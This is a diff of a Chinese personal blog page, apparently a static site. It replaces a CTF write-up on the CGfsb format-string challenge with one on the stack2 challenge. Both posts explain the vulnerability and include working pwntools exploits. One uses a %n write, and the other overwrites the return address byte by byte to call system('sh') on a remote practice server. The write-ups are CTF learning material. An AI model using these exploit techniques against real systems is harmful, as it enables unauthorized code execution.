@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CGfsb_wp, 矢坕个人博客">
+    <meta name="keywords" content="stack2, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CGfsb_wp | 矢坕个人博客</title>
+    <title>stack2 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CGfsb_wp</h1>
+                    <h1 class="description center-align post-title">stack2</h1>
                 </div>
             </div>
         </div>
@@ -443,28 +443,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-27
+                    2023-01-05
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-12-27
+                    2023-01-05
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    440
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
 
@@ -482,27 +482,118 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>先将其在终端checksec一下：<br><img src="/images/CGfsb-wp/1.png"><br>32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护)，但这题开cannary真没感觉有什么用，又不是用栈溢出，奇怪……<br>拖入IDA查看代码<br><img src="/images/CGfsb-wp/2.png"><br>有两个输入点，这里重点看这个printf(s);这个是C语言学习中没涉及到的，等等会细说<br>观察有个system(“cat flag”);可以直接抓取flag于是思路清晰只要然pwnme&#x3D;8就可以了，双击pwnme发现他存储在bss段，我们要如何才能用栈段的数据写到它那去呢？<br>这里就涉及到一个漏洞：格式化字符串漏洞<br>一般上格式是</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>“<span class="token operator">%</span>s”，s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>但变成了</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">%d - 十进制 - 输出十进制整数
-%s - 字符串 - 从内存中读取字符串
-%x - 十六进制 - 输出十六进制数
-%c - 字符 - 输出字符
-%p - 指针 - 指针地址
-%n - 到目前为止所写的字符数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>特别注意%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量比如：<br><img src="/images/CGfsb-wp/3.png"><br>a的值被改变了<br>也就是说他在某种特定环境下可以作为一个scanf来使用（不懂这个打死都别想做出来）<br>我们需要将pwnme的地址输入到s的空间去，在合适的位置上加一个%n，使其与我们输入的地址对应，从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来<br>对其运行输入<br><img src="/images/CGfsb-wp/4.png"><br>发现偏移量为10<br>上exp</p>
+                <h2 id="stack2-wp"><a href="#stack2-wp" class="headerlink" title="stack2 wp"></a>stack2 wp</h2><p>写这篇博客想要稍微弥补一下我动态调试的不足，这题stack2是pwn题的进阶题也算有些难度了吧（大概吧，我没做出来，大佬勿笑……）<br>于是想要和这篇博客再重新做一遍理清一下思路。<br>checksec一下：<br><img src="/images/stack2/1.png"><br>开了canary保护、NX保护和部分RELRO保护按经验不是栈溢出题。<br>IDA分析：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-90h] BYREF</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-8Ch] BYREF</span>
+  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-88h] BYREF</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-84h]</span>
+  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-80h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-7Ch]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-78h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-74h]</span>
+  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+38h] [ebp-70h]</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [esp+9Ch] [ebp-Ch]</span>
+
+  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">99</span> <span class="token punctuation">)</span>
+          <span class="token punctuation">&#123;</span>
+            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>
+            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+          <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"id\t\tnumber"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
+          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\t\t%d\n"</span><span class="token punctuation">,</span> k<span class="token punctuation">,</span> v13<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> j<span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>
+      v9 <span class="token operator">+=</span> v13<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>一张图截不下用代码段算了……这题比较失败的地方就是连漏洞都找错了<br>我开始想将v5赋值成100，然后再第100个数让他足够大把下面溢出覆盖掉，想到有canary压根没法知道，而且数字过于庞大也不好算<del>（太年轻了）</del>大佬笑笑就好<br>没有注意到下面那个替换数字的代码段可以实现栈上（v13以下）任意位置的改写，这样就可以直接改写返回地址，又可以绕过canary的检查，然后想想编程老师上课就<br>有一题这样的例子，我更想撞墙了。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"which number to change:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"new number:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      v13<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>看网上的大佬wp说IDA给的返回地址到v13[0]的地址并不是真实的，因为编译器做了些手脚，在真正编译的时候会有变化（没有尝试）要用动态调试的才是真的<br>老实说本人挺害怕动态调试的，希望能尽快熟悉掌握……<br>在IDA中进行反汇编，查看__isoc99_scanf（）调用的时候<br><img src="/images/stack2/2.png"><br>有个lea    edx, [ebp+var_70],lea指令可以把偏移地址存到dx，相当于C语言中的&amp;符号，而var_70就是ebp与v13的偏移量相当于把v13[0]的地址给了edx<br>于是在动态调试中先在 call    __isoc99_scanf（）处下个断点 r一下：<br><img src="/images/stack2/3.png"><br>单步执行n一直到mov  eax, [ebp+var_7C]：<br><img src="/images/stack2/4.png"><br>此时查看edx中保存的就是v13[0]的地址为0xffffd438，这个地址每次运行都不会一样，大家自己动手调试。<br>虽然IDA里的返回地址不准确但是执行ret指令时，肯定esp指针肯定保存的是返回地址于是在ret指令下个断点 r一下：<br><img src="/images/stack2/5.png"><br>发现esp指针里的值是0xffffd4bc，0xffffd4bc-0xffffd438&#x3D;0x84（十六进制）<br>而IDA里的是0x74显然二者不等。这里还有一个小坑如果这题是在本地打的就可以直接打通了，但如果是远程的话会提示没有bash这里大家可能回去找&#x2F;bin&#x2F;sh字符串去填充替代<br>找也可以找到，但是网上说好像是只读的不可执行，其实用sh也可以打通shell我们在pwndbg中这样找：<br><img src="/images/stack2/6.png"><br>就可以找到很多，这里我选择用第一个（其他没试过不知道行不行，鼓励尝试）<br>记录下call system的地址：<br><img src="/images/stack2/7.png"><br>上exp:（这个exp也是借鉴网上大佬的，用构造函数的写法确实很方便，学到很多）</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56143</span><span class="token punctuation">)</span>
-pwnme<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span>
-payload<span class="token operator">=</span>pwnme<span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">b'%10$n'</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:\n"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"zjh"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please:\n"</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>get shell!拿到flag<br><img src="/images/CGfsb-wp/5.png"></p>
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span><span class="token number">56314</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How many numbers you have:\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Give me your numbers\n"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+<span class="token comment">#addr_call_system = [0xB4,0x85,0x04,0x08]  小端序存储</span>
+<span class="token comment">#addr_sh = [0x87,0x89,0x04,0x08]</span>
+<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"5. exit\n"</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"which number to change:\n"</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"new number:\n"</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0xb4</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x86</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">)</span>
+change<span class="token punctuation">(</span><span class="token number">0x8b</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>获得shell：<br><img src="/images/stack2/8.png"></p>
 
                 
             </div>
@@ -529,7 +620,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/27/CGfsb-wp/">http://airunfive.github.io/2022/12/27/CGfsb-wp/</a>
+                    <a href="http://airunfive.github.io/2023/01/05/stack2/">http://airunfive.github.io/2023/01/05/stack2/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -734,54 +825,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/">
+                <a href="/2023/01/05/stack2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="栈转移原理与通用garget的使用">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="stack2">
                         
-                        <span class="card-title">栈转移原理与通用garget的使用</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-28
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            矢坕
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/12/26/repeater-wp/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="repeater_wp">
-                        
-                        <span class="card-title">repeater_wp</span>
+                        <span class="card-title">stack2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -792,7 +847,45 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            矢坕
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/01/04/Mary-Morton/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Mary_Morton">
+                        
+                        <span class="card-title">Mary_Morton</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-01-04
                             </span>
                         <span class="publish-author">
                             
